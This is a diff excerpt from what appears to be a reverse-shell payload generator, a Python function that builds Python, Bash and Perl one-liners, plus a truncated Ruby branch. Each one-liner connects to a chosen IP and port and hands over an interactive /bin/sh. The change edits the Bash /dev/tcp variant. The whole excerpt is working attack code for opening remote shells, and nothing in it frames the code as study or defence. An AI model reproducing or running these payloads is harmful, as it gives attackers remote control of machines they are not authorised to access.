@@ -20,7 +20,7 @@ def generate_payload():
     elif shell_choice == "Python":
         payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
     elif shell_choice == "Bash":
-        payload = f"/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1"
+        payload = f"bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1"
     elif shell_choice == "Perl":
         payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
     elif shell_choice == "Ruby":
